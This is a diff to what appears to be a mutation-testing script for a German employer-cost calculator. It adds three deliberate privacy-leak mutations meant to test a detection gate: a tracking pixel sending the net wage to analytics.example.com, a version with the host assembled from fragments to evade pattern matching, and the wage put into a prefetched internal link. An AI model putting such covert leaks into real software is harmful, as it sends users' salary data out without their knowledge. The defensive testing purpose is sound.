@@ -34,8 +34,12 @@ const ENGINE = 'lib/calculators/de-employer-cost/engine.ts'
 const CHURCH = 'lib/calculators/de-employer-cost/tax/church-tax.ts'
 const RULES = 'data/calculators/de-employer-cost/2026/rules.ts'
 const VALIDATION = 'lib/calculators/de-employer-cost/validation.ts'
+const COMPONENT = 'components/DeEmployerCostCalculator.tsx'
 
-const TOUCHED = [PAP, BRANCHES, BVV, SCOPE, ENGINE, CHURCH, RULES, VALIDATION]
+/** The anchor the two pixel mutations attach to. */
+const LEDGER = '                <p className="ecc__exactness">{tr(RESULT.ledgerNote)}</p>'
+
+const TOUCHED = [PAP, BRANCHES, BVV, SCOPE, ENGINE, CHURCH, RULES, VALIDATION, COMPONENT]
 const ORIGINAL = new Map(TOUCHED.map((f) => [f, read(f)]))
 
 /**
@@ -194,6 +198,41 @@ const MUTATIONS = [
     file: ENGINE,
     from: "  const issues = validateDeInput(input);\n  if (issues.length > 0) return { supported: false, reason: 'invalid', issues };\n\n  const scope = checkScope({",
     to: "  const scope = checkScope({",
+  },
+  // ── Privacy. Each of these three was written during review as an ATTEMPT to
+  // defeat the gate, and the first two succeeded before it was strengthened.
+  {
+    name: '18. a tracking pixel carrying net, gross and church tax',
+    why:
+      'The defect that got past 315 assertions on the Czech calculator: an attribute that makes the browser issue the ' +
+      'request for you, which no list of transmission APIs covers.',
+    file: COMPONENT,
+    from: LEDGER,
+    to:
+      LEDGER +
+      "\n                <img alt=\"\" src={'https://analytics.example.com/px?net=' + String(outcome.employee.netCent)} />",
+  },
+  {
+    name: '19. the same leak with the host assembled from fragments and a camelCase sink',
+    why:
+      'SURVIVED the original gate. No absolute URL literal exists anywhere, and `backgroundImage` does not match a ' +
+      '`background-image` pattern. Only the runtime wire test caught it, and that test needs a browser.',
+    file: COMPONENT,
+    from: LEDGER,
+    to:
+      LEDGER +
+      "\n                <div style={{ backgroundImage: 'url(' + ['htt','ps:','//','x.example','.com'].join('') + '/p?n=' + String(outcome.employee.netCent) + ')' }} />",
+  },
+  {
+    name: '20. the net wage in a prefetched internal path segment',
+    why:
+      'SURVIVED the original gate. No query string, no fragment, no external origin — and Next.js prefetches it, ' +
+      'putting the reader’s net wage in our own access log on a page that promises the calculation never leaves the browser.',
+    file: COMPONENT,
+    from: "          <Link href={CROSS_LINK_PATH[locale]}>{tr(CROSS_LINK.label)}</Link>",
+    to:
+      "          <Link href={CROSS_LINK_PATH[locale]}>{tr(CROSS_LINK.label)}</Link>\n" +
+      "          <Link href={'/r/' + String(outcome && outcome.supported ? outcome.employee.netCent : 0)}>x</Link>",
   },
 ]
 
